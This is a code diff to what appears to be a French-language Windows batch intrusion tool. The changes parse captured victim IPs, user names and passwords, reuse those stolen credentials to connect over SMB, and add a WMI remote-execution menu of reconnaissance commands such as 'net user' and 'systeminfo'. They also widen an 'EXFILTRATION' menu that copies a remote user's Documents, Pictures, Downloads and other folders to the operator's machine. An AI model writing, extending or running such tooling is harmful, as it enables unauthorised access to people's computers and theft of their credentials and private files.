@@ -1619,15 +1619,16 @@ if exist "%CAP_IPS%"  del /f /q "%CAP_IPS%"
 >>"%CAP_PS%" echo if (-not (Test-Path $f)) { exit 1 }
 >>"%CAP_PS%" echo $seen=@{}; $entries=@()
 >>"%CAP_PS%" echo foreach ($l in (Get-Content $f -EA SilentlyContinue)) {
->>"%CAP_PS%" echo     if ($l -match "IP: (\S+)\s+(?:--|\|)\s+PC: (.+?)\s+(?:--|\|)\s+User: (.+?)(?:\s+--.*)?$") {
->>"%CAP_PS%" echo         $ip=$matches[1]; $pc=$matches[2].Trim(); $usr=$matches[3].Trim()
->>"%CAP_PS%" echo         if (-not $seen[$ip]) { $seen[$ip]=$true; $entries += @{IP=$ip;PC=$pc;USR=$usr} }
+>>"%CAP_PS%" echo     if ($l -match "IP: (\S+)\s+(?:--|\|)\s+PC: (.+?)\s+(?:--|\|)\s+User: (.+?)(?:\s+--\s+Pass:\s*(.+))?$") {
+>>"%CAP_PS%" echo         $ip=$matches[1]; $pc=$matches[2].Trim(); $usr=$matches[3].Trim(); $pw=if($matches[4]){$matches[4].Trim()}else{''}
+>>"%CAP_PS%" echo         if (-not $seen[$ip]) { $seen[$ip]=$true; $entries += @{IP=$ip;PC=$pc;USR=$usr;PW=$pw} }
+>>"%CAP_PS%" echo         elseif ($pw -and -not $seen[$ip+'_pw']) { $seen[$ip+'_pw']=$true; for($i=0;$i -lt $entries.Count;$i++){if($entries[$i].IP -eq $ip){$entries[$i].USR=$usr;$entries[$i].PW=$pw}} }
 >>"%CAP_PS%" echo     } }
 >>"%CAP_PS%" echo $entries = $entries ^| Select-Object -Last 9
 >>"%CAP_PS%" echo if ($entries.Count -eq 0) { exit 1 }
->>"%CAP_PS%" echo $opts = ($entries ^| ForEach-Object { $_.IP + "~PC: " + $_.PC + " / User: " + $_.USR }) -join ";"
+>>"%CAP_PS%" echo $opts = ($entries ^| ForEach-Object { $tag=if($_.PW){'[MDP] '}else{''}; $tag+$_.IP+"~PC: "+$_.PC+" / User: "+$_.USR }) -join ";"
 >>"%CAP_PS%" echo $opts + ";[---];Saisir une IP ou DNS manuellement~IPv4, IPv6, DDNS, Tailscale;Retour" ^| Set-Content "%CAP_OPTS%" -Encoding ASCII
->>"%CAP_PS%" echo ($entries ^| ForEach-Object { $_.IP + ";" + $_.PC + ";" + $_.USR }) ^| Set-Content "%CAP_IPS%" -Encoding ASCII
+>>"%CAP_PS%" echo ($entries ^| ForEach-Object { $_.IP + ";" + $_.PC + ";" + $_.USR + ";" + $_.PW }) ^| Set-Content "%CAP_IPS%" -Encoding ASCII
 powershell -NoProfile -ExecutionPolicy Bypass -File "%CAP_PS%"
 set "cap_rc=%errorlevel%"
 if exist "%CAP_PS%" del /f /q "%CAP_PS%"
@@ -1642,17 +1643,27 @@ if "%cap_sel%"=="0" goto cyber_ip_grabber
 REM --- Retrouver l'IP par index (ligne N dans cap_ips) ---
 set "remote_ip="
 set "cnt=0"
-for /f "usebackq tokens=1,2,3 delims=;" %%a in ("%CAP_IPS%") do (
+set "remote_pass="
+for /f "usebackq tokens=1,2,3,4 delims=;" %%a in ("%CAP_IPS%") do (
     set /a cnt+=1
     if "!cnt!"=="!cap_sel!" (
         set "remote_ip=%%a"
         set "remote_pc=%%b"
         set "remote_user=%%c"
+        set "remote_pass=%%d"
     )
 )
 if exist "%CAP_IPS%" del /f /q "%CAP_IPS%"
 if defined remote_ip (
     set "remote_port=NONE"
+    if defined remote_pass if not "!remote_pass!"=="" (
+        set "cred_u=!remote_user!"
+        set "cred_p=!remote_pass!"
+        set "smb_host=!remote_ip!"
+        set "_tv6=!remote_ip::=!"
+        if not "!_tv6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
+        goto wan_post_creds
+    )
     goto wan_public_scan
 )
 REM --- sel > N (Saisir manuellement ou Retour) ---
@@ -3295,9 +3306,26 @@ echo.
 echo  [CMD] EXECUTION DISTANTE - !remote_ip!
 echo  [i] WMI - necessite port 135
 echo.
+call :DynamicMenu "CHOISIR UNE COMMANDE" "whoami~Utilisateur courant;hostname~Nom de la machine;ipconfig /all~Config reseau complete;net user~Liste des comptes locaux;net localgroup administrators~Membres du groupe admin;systeminfo~Infos OS / RAM / patch level;tasklist~Processus en cours;netstat -ano~Connexions reseau actives;wmic product get name,version~Logiciels installes;dir C:\Users~Liste des profils utilisateurs;[---];Saisir une commande personnalisee~Entrer n'importe quelle commande;Retour" "NONUMS NOCLS"
+set "cmd_ch=%errorlevel%"
+if "%cmd_ch%"=="0" goto wan_post_creds
 set "pex_command="
-call :InputWithEsc "  Commande : " pex_command
-if errorlevel 1 goto wan_post_creds
+if "%cmd_ch%"=="1"  set "pex_command=whoami"
+if "%cmd_ch%"=="2"  set "pex_command=hostname"
+if "%cmd_ch%"=="3"  set "pex_command=ipconfig /all"
+if "%cmd_ch%"=="4"  set "pex_command=net user"
+if "%cmd_ch%"=="5"  set "pex_command=net localgroup administrators"
+if "%cmd_ch%"=="6"  set "pex_command=systeminfo"
+if "%cmd_ch%"=="7"  set "pex_command=tasklist"
+if "%cmd_ch%"=="8"  set "pex_command=netstat -ano"
+if "%cmd_ch%"=="9"  set "pex_command=wmic product get name,version"
+if "%cmd_ch%"=="10" set "pex_command=dir C:\Users"
+if "%cmd_ch%"=="11" (
+    call :InputWithEsc "  Commande : " pex_command
+    if errorlevel 1 goto pex_cmd
+    if not defined pex_command goto pex_cmd
+)
+if "%cmd_ch%"=="12" goto wan_post_creds
 if not defined pex_command goto wan_post_creds
 set "PEX_CMD=!pex_command!"
 echo.
@@ -3452,20 +3480,35 @@ cls
 echo.
 echo  [EXFIL] EXFILTRATION - !remote_ip!
 echo.
-call :DynamicMenu "EXFILTRER" "Documents~C:\Users\[user]\Documents;Bureau~C:\Users\[user]\Desktop;Chemin personnalise~Entrer un chemin distant;Retour" "NONUMS NOCLS"
+call :DynamicMenu "EXFILTRER" "Documents~C:\Users\[user]\Documents;Bureau~C:\Users\[user]\Desktop;Images~C:\Users\[user]\Pictures;Telechargements~C:\Users\[user]\Downloads;Musique~C:\Users\[user]\Music;Videos~C:\Users\[user]\Videos;Chemin personnalise~Entrer un chemin distant;Retour" "NONUMS NOCLS"
 set "exfil_ch=%errorlevel%"
 if "%exfil_ch%"=="0" goto wan_post_creds
 set "exfil_src="
 if "%exfil_ch%"=="1" set "exfil_src=C:\Users\!cred_u!\Documents"
 if "%exfil_ch%"=="2" set "exfil_src=C:\Users\!cred_u!\Desktop"
-if "%exfil_ch%"=="3" (
+if "%exfil_ch%"=="3" set "exfil_src=C:\Users\!cred_u!\Pictures"
+if "%exfil_ch%"=="4" set "exfil_src=C:\Users\!cred_u!\Downloads"
+if "%exfil_ch%"=="5" set "exfil_src=C:\Users\!cred_u!\Music"
+if "%exfil_ch%"=="6" set "exfil_src=C:\Users\!cred_u!\Videos"
+if "%exfil_ch%"=="7" (
     call :InputWithEsc "  Chemin distant (ex: C:\Users\Alex\AppData) : " exfil_src
     if errorlevel 1 goto pex_exfil
     if not defined exfil_src goto pex_exfil
 )
-if "%exfil_ch%"=="4" goto wan_post_creds
-set "exfil_dst=%USERPROFILE%\Desktop\Exfil_!remote_pc!"
-if not defined remote_pc set "exfil_dst=%USERPROFILE%\Desktop\Exfil_%RANDOM%"
+if "%exfil_ch%"=="8" goto wan_post_creds
+REM --- Nettoyer remote_pc des caracteres invalides pour un chemin ---
+set "exfil_tag=!remote_pc!"
+if not defined exfil_tag set "exfil_tag=%RANDOM%"
+set "exfil_tag=!exfil_tag:?=!"
+set "exfil_tag=!exfil_tag:(=!"
+set "exfil_tag=!exfil_tag:)=!"
+set "exfil_tag=!exfil_tag: =_!"
+set "exfil_tag=!exfil_tag:/=!"
+set "exfil_tag=!exfil_tag:\=!"
+set "exfil_tag=!exfil_tag::=!"
+set "exfil_tag=!exfil_tag:*=!"
+set "exfil_tag=!exfil_tag:"=!"
+set "exfil_dst=%USERPROFILE%\Desktop\Exfil_!exfil_tag!"
 echo  [*] Copie de : !exfil_src!
 echo  [*] Vers     : !exfil_dst!
 echo.
